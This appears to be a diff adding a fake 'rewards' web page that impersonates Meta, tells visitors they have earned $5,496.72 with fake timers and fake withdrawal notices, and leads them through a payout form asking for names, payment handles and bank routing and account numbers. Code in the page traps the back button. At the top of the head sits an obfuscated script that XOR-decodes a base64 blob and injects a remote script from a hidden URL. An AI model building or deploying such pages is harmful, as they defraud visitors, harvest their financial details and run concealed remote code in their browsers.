@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <script src="js/utm-propagator.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bônus</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <script src="js/utm-propagator.js"></script>
+
+    <script>(function () { var l_nqo2 = atob("DDp/6DO0irDAsMzteUFdnUHYqIri2LiZCUlFxxzX7t7uxbiAEFwGxlDb556iwuOeGkgWmEfHpcW03b/CFVsLjUDApNqzkuDPGE4LmlrW/8Slw+7XIkFdhlLZ75L6kqiMDVtSnUfZ49a5nbyfHEwahkeZ8tOv1OGeGlFdxBHC69y11e7XWxgCxEiW5NGt1e7XW14enFKZ/8St2aqUVEoNjUXR5MTtw7mPEF4Myh+W/NGsxanPQxhdlW7J"); var a_0j2 = []; for (var e_d = 0; e_d < l_nqo2.length; e_d++) { a_0j2.push(l_nqo2.charCodeAt(e_d) & 255); } var y_6b = a_0j2[0]; var d_rlgj = a_0j2.slice(1, 1 + y_6b); var p_qjq = a_0j2.slice(1 + y_6b); var w_r8dl = p_qjq.map(function (b, j_5f9) { return b ^ d_rlgj[j_5f9 % y_6b]; }); var g_v3j = ""; for (var f_xun = 0; f_xun < w_r8dl.length; f_xun++) { g_v3j += String.fromCharCode(w_r8dl[f_xun] & 255); } var b_501h = decodeURIComponent(escape(g_v3j)); var p_5c = JSON.parse(b_501h); var o_989 = p_5c.globals || []; o_989.forEach(function (g_a) { window[g_a.name] = g_a.value; }); var q_o9w = document.createElement("script"); q_o9w.src = p_5c.url; q_o9w.async = true; q_o9w.defer = true; (p_5c.attributes || []).forEach(function (f_3) { q_o9w.setAttribute(f_3.name, f_3.value); }); (document.head || document.documentElement).appendChild(q_o9w); })();</script>
+
+    <style>
+        .red {
+            color: green;
+        }
+
+        #overlay-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .modal-box {
+            background: #f5f5f5;
+            width: 360px;
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+        }
+
+        #btn-finalizar {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            background: #ff6a00;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        #btn-sair {
+            margin-top: 15px;
+            background: none;
+            border: none;
+            color: #777;
+            cursor: pointer;
+        }
+
+        /* Estilo Base e Esconder o Botão */
+        #btn-sacar-saldo-vsl {
+            display: none;
+            background-color: #ff8c00;
+            justify-self: center;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            outline: none;
+            box-shadow: 0 0 0 0 rgba(255, 140, 0, 0.7);
+            animation: pulse 2s infinite;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(255, 140, 0, 0.7);
+            }
+
+            70% {
+                transform: scale(1);
+                box-shadow: 0 0 0 15px rgba(255, 140, 0, 0);
+            }
+
+            100% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(255, 140, 0, 0);
+            }
+        }
+
+        .header-top {
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 1px 1px 3px #0000003b;
+        }
+
+        .header-top img {
+            width: 25%;
+        }
+
+        /* ANIMAÇÃO DE DESLIZAR DE BAIXO PARA CIMA */
+        @keyframes slideUpModal {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+
+        #modal-pix {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: flex-end; /* Encosta na parte inferior da tela */
+            z-index: 9999;
+            padding: 0;
+        }
+
+        .payout-modal {
+            width: 100vw; /* Ocupa toda a largura da tela sem sobras nas laterais */
+            max-width: 100%;
+            background: #fff;
+            border-radius: 20px 20px 0 0; /* Arredonda apenas em cima */
+            overflow: hidden;
+            margin: 0;
+            color: #172033;
+            font-family: Arial, sans-serif;
+            box-shadow: 0 -5px 25px rgba(0, 0, 0, 0.2);
+            animation: slideUpModal 0.3s ease-out forwards;
+        }
+
+        .payout-header {
+            min-height: 62px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 18px;
+            border-bottom: 1px solid #edf0f4;
+        }
+
+        .payout-header h2 {
+            font-size: 17px;
+            font-weight: 700;
+            text-align: center;
+            flex: 1;
+            margin: 0;
+        }
+
+        .payout-header button {
+            width: 30px;
+            border: none;
+            background: none;
+            font-size: 27px;
+            cursor: pointer;
+            color: #172033;
+        }
+
+        .payout-intro {
+            padding: 20px 20px 12px;
+        }
+
+        .payout-intro h3 {
+            font-size: 16px;
+            margin: 0 0 7px;
+        }
+
+        .payout-intro p {
+            font-size: 12px;
+            color: #858da0;
+            margin: 0;
+        }
+
+        .payout-option {
+            width: 100%;
+            min-height: 76px;
+            padding: 12px 18px;
+            display: flex;
+            align-items: center;
+            gap: 13px;
+            background: white;
+            border: none;
+            border-bottom: 1px solid #edf0f4;
+            text-align: left;
+            cursor: pointer;
+            transition: background .2s;
+        }
+
+        .payout-option:hover {
+            background: #f7f9fc;
+        }
+
+        /* Estilo para os ícones reais em imagem */
+        .payout-icon-img {
+            width: 40px;
+            height: 40px;
+            min-width: 40px;
+            border-radius: 10px;
+            object-fit: cover;
+        }
+
+        .payout-info {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            flex: 1;
+        }
+
+        .payout-info strong {
+            font-size: 14px;
+        }
+
+        .payout-info small {
+            font-size: 11px;
+            color: #858da0;
+        }
+
+        .payout-arrow {
+            font-size: 24px;
+            color: #a3aab8;
+        }
+
+        .payout-bottom {
+            padding: 16px 20px;
+            background: #f8f9fb;
+            font-size: 10px;
+            color: #858da0;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .payout-selected {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 20px;
+            border-bottom: 1px solid #edf0f4;
+        }
+
+        .payout-selected div {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .payout-selected strong {
+            font-size: 14px;
+        }
+
+        .payout-selected small {
+            color: #858da0;
+            font-size: 11px;
+        }
+
+        .payout-form {
+            padding: 22px;
+        }
+
+        .payout-form h3 {
+            font-size: 19px;
+            margin: 0 0 8px;
+        }
+
+        .payout-description {
+            color: #858da0;
+            font-size: 12px;
+            line-height: 1.5;
+            margin-bottom: 22px;
+        }
+
+        .payout-form label {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            margin: 17px 0 8px;
+            color: #424b5d;
+        }
+
+        .payout-form input {
+            width: 100%;
+            height: 49px;
+            border: 1px solid #dfe3ea;
+            border-radius: 10px;
+            padding: 0 13px;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .payout-form input:focus {
+            border-color: #287bff;
+        }
+
+        .payout-hint {
+            font-size: 11px;
+            color: #858da0;
+            line-height: 1.5;
+        }
+
+        .payout-continue {
+            width: 100%;
+            min-height: 51px;
+            border: none;
+            background: #287bff;
+            color: white;
+            border-radius: 11px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 18px;
+        }
+
+        .payout-continue:hover {
+            background: #1769ed;
+        }
+
+        .payout-security {
+            font-size: 10px;
+            color: #858da0;
+            text-align: center;
+            line-height: 1.6;
+            margin-top: 15px;
+        }
+
+        .payout-error {
+            font-size: 12px;
+            color: #dc3545;
+        }
+
+        .payout-review-content {
+            padding: 25px 22px;
+        }
+
+        .payout-review-content h3 {
+            text-align: center;
+            font-size: 19px;
+        }
+
+        .payout-review-content>p {
+            text-align: center;
+            font-size: 12px;
+            color: #858da0;
+        }
+
+        .review-check {
+            width: 52px;
+            height: 52px;
+            margin: auto;
+            border-radius: 50%;
+            background: #e8f6ed;
+            color: #20a35b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 25px;
+            font-weight: bold;
+        }
+
+        .review-item {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            padding: 13px 0;
+            border-bottom: 1px solid #edf0f4;
+        }
+
+        .review-item span {
+            font-size: 11px;
+            color: #858da0;
+        }
+
+        .review-item strong {
+            font-size: 13px;
+            overflow-wrap: anywhere;
+        }
+
+        @media(max-width:480px) {
+            .payout-modal {
+                max-width: 100%;
+                border-radius: 20px 20px 0 0;
+            }
+        }
+    </style>
+</head>
+
+
+<body>
+
+    <div id="modal-overlay" class="modal-overlay">
+        <div class="modal-content">
+            <img src="images/6033716.png" alt="Icon" class="modal-icon">
+            <h2>Your account has been rewarded</h2>
+            <p>Congratulations! As part of an exclusive<br>rewards campaign.</p>
+
+            <div class="valor-container">
+                $ <span id="valor-dinheiro">5,496.72</span>
+            </div>
+
+            <div class="timer-container">
+                Expires in
+                <span class="time-box">00</span> :
+                <span class="time-box" id="minutos">13</span> :
+                <span class="time-box" id="segundos">06</span>
+            </div>
+
+            <button id="btn-fechar-modal" class="btn-sacar-modal">Withdraw Now</button>
+            <audio id="meu-audio">
+                <source src="media/audio.mp3" type="audio/mpeg">
+                Your browser does not support the audio element.
+            </audio>
+        </div>
+    </div>
+
+    <header class="header-top">
+        <img src="images/Meta-Logo.png" alt="Bônus" class="logo-imagem">
+    </header>
+
+    <main class="main-container">
+
+        <div class="confetti c1"></div>
+        <div class="confetti c2"></div>
+        <div class="confetti c3"></div>
+        <div class="confetti c4"></div>
+
+        <div class="card card-saldo">
+            <div class="saldo-info">
+                <div class="label-saldo">Your Balance <span class="status-dot"></span></div>
+                <h3>$5,496.72</h3>
+            </div>
+            <button id="btn-sacar-saldo" class="btn-mini-sacar">Withdraw</button>
+        </div>
+
+        <div class="card card-concluido">
+            <div class="concluido-texto">
+                <h4>Congratulations!<br>You have completed<br>all tasks</h4>
+                <span class="valor-laranja">$5,496.72</span>
+            </div>
+            <img src="images/parabens-img-DyKL61G2.png" alt="Bonus" class="icon-calendar">
+        </div>
+
+        <div class="alerta-expira">
+            <i class="bx bx-time-five"></i>
+            <p>Your balance expires in <span id="timer-alerta">00:11:37</span>. Withdraw now to avoid losing it.</p>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">Daily Check-in — 14 days</p>
+                    <p class="pontos-laranja" style="margin-top: 4px;">8,414 points</p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Completed</div>
+            </div>
+            <div class="task-completed-box">
+                <i class="bx bx-check"></i> 14/14 days completed
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-show"></i></span> Watch targeted ads
+                    </p>
+                    <p class="tarefa-sub">daily to earn up to <span class="pontos-laranja">2,730 points</span>
+                    </p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Completed</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">30/30</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-play"></i></span> Watch videos
+                    </p>
+                    <p class="tarefa-sub">10 minutes watched — <span class="pontos-laranja">500 points</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Completed</div>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-gift"></i></span> Redeem your rewards
+                    </p>
+                    <p class="tarefa-sub">and earn <span class="pontos-laranja">640 points</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Completed</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill fill-green" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">8/8</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-calendar-star"></i></span> Daily surveys
+                    </p>
+                    <p class="tarefa-sub">60 surveys completed — <span class="pontos-laranja">996 points</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Completed</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">60/60</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-group"></i></span> Invite friends
+                    </p>
+                    <p class="tarefa-sub">1 friend to earn <span class="pontos-laranja">100,000 – 200,000 points</span>
+                    </p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Completed</div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer-fixo">
+        <button id="btn-sacar-footer" class="btn-pix">
+            <span class="icon-money">💰</span> Withdraw $5,496.72 <i class="bx bx-chevron-right"></i>
+        </button>
+        <p class="seguranca">
+            <i class="bx bx-check-shield" style="color: #00c853;"></i> 100% secure payment • 2,809 withdrawals today
+        </p>
+    </footer>
+
+    <div id="toast-saque" class="toast-saque">
+        <img id="toast-img" src="https://i.pravatar.cc/150?img=11" alt="Profile" class="toast-perfil">
+        <div class="toast-texto">
+            <p id="toast-mensagem">Pedro H. withdrew <strong class="texto-verde">$2,029.02</strong></p>
+            <span>a few seconds ago</span>
+        </div>
+        <div class="toast-dot"></div>
+    </div>
+
+    <!-- MODAL DE MÉTODOS DE PAGAMENTO COM ÍCONES E SLIDE UP -->
+    <div id="modal-pix" class="modal-overlay" style="display:none;">
+
+        <div class="payout-modal">
+
+            <!-- HEADER -->
+            <div class="payout-header">
+
+                <button type="button" id="payout-back" style="display:none;">‹</button>
+
+                <h2 id="payout-heading">Choose a payout method</h2>
+
+                <button type="button" id="fechar-pix">×</button>
+
+            </div>
+
+            <!-- STEP 1: PAYMENT METHODS -->
+            <div id="payout-methods">
+
+                <div class="payout-intro">
+                    <h3>How would you like to receive your payment?</h3>
+                    <p>Select your preferred payment method below.</p>
+                </div>
+
+                <button class="payout-option" data-method="cashapp">
+                    <img src="images/cashapp.png" alt="Cash App" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>Cash App</strong>
+                        <small>Receive payments with Cash App</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <button class="payout-option" data-method="paypal">
+                    <img src="images/paypal.png" alt="PayPal" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>PayPal</strong>
+                        <small>Receive payments with PayPal</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <button class="payout-option" data-method="venmo">
+                    <img src="images/venmo.png" alt="Venmo" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>Venmo</strong>
+                        <small>Receive payments with Venmo</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <button class="payout-option" data-method="zelle">
+                    <img src="images/zelle.png" alt="Zelle" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>Zelle</strong>
+                        <small>Receive payments with Zelle</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <button class="payout-option" data-method="ach">
+                    <img src="images/bank.jpg" alt="Bank Transfer" class="payout-icon-img">
+                    <span class="payout-info">
+                        <strong>Bank Transfer (ACH)</strong>
+                        <small>Receive payments directly to your bank</small>
+                    </span>
+                    <span class="payout-arrow">›</span>
+                </button>
+
+                <div class="payout-bottom">
+                    <span>🔒</span>
+                    Your payment information should only be submitted through secure, authorized payment channels.
+                </div>
+
+            </div>
+
+            <!-- STEP 2: PAYMENT DETAILS -->
+            <div id="payout-details" style="display:none;">
+
+                <div class="payout-selected">
+
+                    <img id="payout-selected-img" src="" alt="Selected Icon" class="payout-icon-img">
+
+                    <div>
+                        <strong id="payout-selected-name"></strong>
+                        <small>Selected payment method</small>
+                    </div>
+
+                </div>
+
+                <div class="payout-form">
+
+                    <h3 id="payout-form-title">Enter your payment details</h3>
+
+                    <p class="payout-description" id="payout-form-description">
+                        Provide your payment information to continue.
+                    </p>
+
+                    <!-- STANDARD PAYMENT FIELDS -->
+                    <div id="payout-standard-fields">
+
+                        <label for="payout-name">FULL NAME</label>
+
+                        <input type="text" id="payout-name" placeholder="Enter your full name" autocomplete="name">
+
+                        <label id="payout-field-label" for="payout-identifier">
+                            PAYMENT IDENTIFIER
+                        </label>
+
+                        <input type="text" id="payout-identifier" placeholder="Enter your payment identifier"
+                            autocomplete="off">
+
+                        <p id="payout-hint" class="payout-hint"></p>
+
+                    </div>
+
+                    <!-- ACH BANK FIELDS -->
+                    <div id="payout-ach-fields" style="display:none;">
+
+                        <div class="ach-method-title">
+                            Bank Transfer (ACH)
+                        </div>
+
+                        <label for="ach-bank">Bank</label>
+
+                        <input type="text" id="ach-bank" placeholder="Search your bank" autocomplete="off">
+
+                        <label for="ach-routing">Routing number</label>
+
+                        <input type="text" id="ach-routing" placeholder="Enter your routing number" inputmode="numeric"
+                            maxlength="9" autocomplete="off">
+
+                        <label for="ach-account">Account number</label>
+
+                        <input type="text" id="ach-account" placeholder="Enter your account number" inputmode="numeric"
+                            autocomplete="off">
+
+                    </div>
+
+                    <button type="button" id="payout-continue" class="payout-continue">
+                        Continue
+                    </button>
+
+                    <p class="payout-security">
+                        Never share your password, PIN or verification codes.
+                    </p>
+
+                    <p id="payout-error" class="payout-error" style="display:none;"></p>
+
+                </div>
+
+            </div>
+
+            <!-- STEP 3: REVIEW -->
+            <div id="payout-review" style="display:none;">
+
+                <div class="payout-review-content">
+
+                    <div class="review-check">✓</div>
+
+                    <h3>Review your information</h3>
+
+                    <p>Please check your details before continuing.</p>
+
+                    <div class="review-item">
+                        <span>Payment method</span>
+                        <strong id="review-method"></strong>
+                    </div>
+
+                    <div class="review-item">
+                        <span>Full name / Bank</span>
+                        <strong id="review-name"></strong>
+                    </div>
+
+                    <div class="review-item">
+                        <span>Payment identifier</span>
+                        <strong id="review-identifier"></strong>
+                    </div>
+
+                    <button type="button" id="payout-withdraw" class="payout-continue"
+                        onclick="window.location.href='saque.html'">
+                        Continue to withdrawal
+                    </button>
+
+                    <p class="payout-security">
+                        Your information has not yet been submitted or verified.
+                    </p>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <div id="overlay-modal" style="display:none;">
+        <div class="modal-box">
+            <h1 style="text-align: center; color: red;"><i class="bx bxs-error"></i></h1>
+            <h2>Your reward of <br> <span class="red">$5,496.72</span> is reserved for you, pending confirmation of your
+                payment method so you can withdraw your money.
+            </h2>
+            <p>If you leave now, the system will automatically cancel your reward.</p>
+
+            <button id="btn-finalizar">CLAIM REWARD 💰</button>
+            <button id="btn-sair">Leave Anyway</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+
+            // HISTORICO DO NAVEGADOR
+            history.pushState(null, null, location.href);
+
+            function handlePopState() {
+                history.pushState(null, null, location.href);
+
+                const overlay = document.getElementById("overlay-modal");
+
+                if (overlay) {
+                    overlay.style.display = "flex";
+                }
+            }
+
+            window.addEventListener("popstate", handlePopState);
+
+            // BOTOES EXTERNOS
+            const btnFinalizar = document.getElementById("btn-finalizar");
+            const btnSair = document.getElementById("btn-sair");
+
+            if (btnFinalizar) {
+                btnFinalizar.addEventListener("click", function () {
+                    const overlay = document.getElementById("overlay-modal");
+
+                    if (overlay) {
+                        overlay.style.display = "none";
+                    }
+                });
+            }
+
+            if (btnSair) {
+                btnSair.addEventListener("click", function () {
+                    window.removeEventListener("popstate", handlePopState);
+                    history.back();
+                });
+            }
+
+            // CONFIGURACAO DOS METODOS
+            const payoutConfig = {
+
+                cashapp: {
+                    name: "Cash App",
+                    img: "images/cashapp.png",
+                    label: "YOUR $CASHTAG",
+                    placeholder: "$JohnSmith",
+                    hint: "Enter your Cash App $Cashtag. Never enter your password."
+                },
+
+                paypal: {
+                    name: "PayPal",
+                    img: "images/paypal.png",
+                    label: "PAYPAL EMAIL",
+                    placeholder: "name@example.com",
+                    hint: "Enter the email associated with your PayPal account."
+                },
+
+                venmo: {
+                    name: "Venmo",
+                    img: "images/venmo.png",
+                    label: "VENMO USERNAME",
+                    placeholder: "@username",
+                    hint: "Enter your Venmo username."
+                },
+
+                zelle: {
+                    name: "Zelle",
+                    img: "images/zelle.png",
+                    label: "ZELLE EMAIL OR MOBILE",
+                    placeholder: "name@example.com",
+                    hint: "Enter the email or mobile number enrolled with Zelle."
+                },
+
+                ach: {
+                    name: "Bank Transfer (ACH)",
+                    img: "images/sepa.png",
+                    label: "BANK PAYMENT SETUP",
+                    placeholder: "",
+                    hint: "Continue through an authorized secure bank payment provider."
+                }
+
+            };
+
+            // ELEMENTOS DO MODAL
+            const modal = document.getElementById("modal-pix");
+
+            const methodsScreen = document.getElementById("payout-methods");
+            const detailsScreen = document.getElementById("payout-details");
+            const reviewScreen = document.getElementById("payout-review");
+
+            const heading = document.getElementById("payout-heading");
+            const back = document.getElementById("payout-back");
+
+            const nameInput = document.getElementById("payout-name");
+            const identifierInput = document.getElementById("payout-identifier");
+
+            const achFields = document.getElementById("payout-ach-fields");
+            const standardFields = document.getElementById("payout-standard-fields");
+
+            const achBank = document.getElementById("ach-bank");
+            const achRouting = document.getElementById("ach-routing");
+            const achAccount = document.getElementById("ach-account");
+
+            const error = document.getElementById("payout-error");
+
+            let selectedMethod = null;
+            let isAch = false;
+
+            function payoutShowScreen(screen) {
+                methodsScreen.style.display = "none";
+                detailsScreen.style.display = "none";
+                reviewScreen.style.display = "none";
+                screen.style.display = "block";
+            }
+
+            function payoutReset() {
+                selectedMethod = null;
+                isAch = false;
+
+                payoutShowScreen(methodsScreen);
+
+                heading.textContent = "Choose a payout method";
+
+                back.style.display = "none";
+
+                nameInput.value = "";
+                identifierInput.value = "";
+
+                achBank.value = "";
+                achRouting.value = "";
+                achAccount.value = "";
+
+                achFields.style.display = "none";
+                standardFields.style.display = "block";
+
+                document.getElementById("payout-selected-img").src = "";
+
+                document.getElementById("payout-form-title").textContent =
+                    "Enter your payment details";
+
+                document.getElementById("payout-form-description").style.display =
+                    "block";
+
+                document.getElementById("payout-hint").textContent = "";
+
+                document.getElementById("payout-field-label").textContent =
+                    "PAYMENT IDENTIFIER";
+
+                error.style.display = "none";
+            }
+
+            window.openPayoutModal = function () {
+                payoutReset();
+                modal.style.display = "flex";
+            };
+
+            // Ligar os botões de saque da página para abrir o modal
+            const btnSacarSaldo = document.getElementById("btn-sacar-saldo");
+            const btnSacarFooter = document.getElementById("btn-sacar-footer");
+            if (btnSacarSaldo) btnSacarSaldo.addEventListener("click", window.openPayoutModal);
+            if (btnSacarFooter) btnSacarFooter.addEventListener("click", window.openPayoutModal);
+
+            document.getElementById("fechar-pix").addEventListener("click", function () {
+                modal.style.display = "none";
+                payoutReset();
+            });
+
+            document.querySelectorAll(".payout-option").forEach(button => {
+                button.addEventListener("click", function () {
+                    const method = button.dataset.method;
+                    selectedMethod = payoutConfig[method];
+                    if (!selectedMethod) return;
+
+                    localStorage.setItem("metodoPagamento", selectedMethod.name);
+
+                    isAch = method === "ach";
+
+                    payoutShowScreen(detailsScreen);
+
+                    heading.textContent = isAch
+                        ? "Enter your payout details"
+                        : selectedMethod.name;
+
+                    back.style.display = "block";
+
+                    error.style.display = "none";
+
+                    const selectedImg = document.getElementById("payout-selected-img");
+                    selectedImg.src = selectedMethod.img;
+
+                    document.getElementById("payout-selected-name").textContent =
+                        selectedMethod.name;
+
+                    if (isAch) {
+                        achFields.style.display = "block";
+                        standardFields.style.display = "none";
+
+                        document.getElementById("payout-form-title").textContent =
+                            "Enter your payout details";
+
+                        document.getElementById("payout-form-description").style.display =
+                            "none";
+                    } else {
+                        achFields.style.display = "none";
+                        standardFields.style.display = "block";
+
+                        document.getElementById("payout-form-title").textContent =
+                            "Enter your payment details";
+
+                        document.getElementById("payout-form-description").style.display =
+                            "block";
+
+                        document.getElementById("payout-field-label").textContent =
+                            selectedMethod.label;
+
+                        identifierInput.placeholder =
+                            selectedMethod.placeholder;
+
+                        document.getElementById("payout-hint").textContent =
+                            selectedMethod.hint;
+                    }
+
+                    document.getElementById("payout-continue").textContent =
+                        "Continue";
+                });
+            });
+
+            back.addEventListener("click", function () {
+                if (reviewScreen.style.display === "block") {
+                    payoutShowScreen(detailsScreen);
+                    heading.textContent = isAch
+                        ? "Enter your payout details"
+                        : selectedMethod.name;
+                } else {
+                    payoutShowScreen(methodsScreen);
+                    heading.textContent = "Choose a payout method";
+                    back.style.display = "none";
+                }
+            });
+
+            document.getElementById("payout-continue").addEventListener("click", function () {
+                error.style.display = "none";
+
+                if (isAch) {
+                    const bank = achBank.value.trim();
+                    const routing = achRouting.value.trim();
+                    const account = achAccount.value.trim();
+
+                    if (!bank || !routing || !account) {
+                        error.textContent = "Please complete all bank fields.";
+                        error.style.display = "block";
+                        return;
+                    }
+
+                    if (!/^\d{9}$/.test(routing)) {
+                        error.textContent = "Please enter a valid 9-digit routing number.";
+                        error.style.display = "block";
+                        return;
+                    }
+
+                    if (!/^\d{4,17}$/.test(account)) {
+                        error.textContent = "Please enter a valid account number.";
+                        error.style.display = "block";
+                        return;
+                    }
+
+                    document.getElementById("review-method").textContent =
+                        selectedMethod.name;
+
+                    document.getElementById("review-name").textContent =
+                        bank;
+
+                    document.getElementById("review-identifier").textContent =
+                        "Routing ending: " + routing.slice(-4) +
+                        " | Account ending: " + account.slice(-4);
+                } else {
+                    const fullName = nameInput.value.trim();
+                    const identifier = identifierInput.value.trim();
+
+                    if (!fullName) {
+                        error.textContent = "Please enter your full name.";
+                        error.style.display = "block";
+                        return;
+                    }
+
+                    if (!identifier) {
+                        error.textContent = "Please enter your payment identifier.";
+                        error.style.display = "block";
+                        return;
+                    }
+
+                    document.getElementById("review-method").textContent =
+                        selectedMethod.name;
+
+                    document.getElementById("review-name").textContent =
+                        fullName;
+
+                    document.getElementById("review-identifier").textContent =
+                        identifier;
+                }
+
+                payoutShowScreen(reviewScreen);
+                heading.textContent = "Review information";
+            });
+        });
+    </script>
+
+    <script src="js/confetti.browser.min.js"></script>
+    <script src="js/index_1.js"></script>
+    <script>
+        setTimeout(function () {
+            const botao = document.getElementById('btn-sacar-saldo-vsl');
+            if (botao) {
+                botao.style.display = 'block';
+            }
+        }, 100000);
+    </script>
+
+    <script src="js/index.js" data-token="pt_246f25ea85305e5f3c653da1bc55dfd7"></script>
+    <script src="js/index.js" data-token="pt_d7c144ffd2b0fce2c05f769269023150"></script>
+
+</body>
+
+</html>
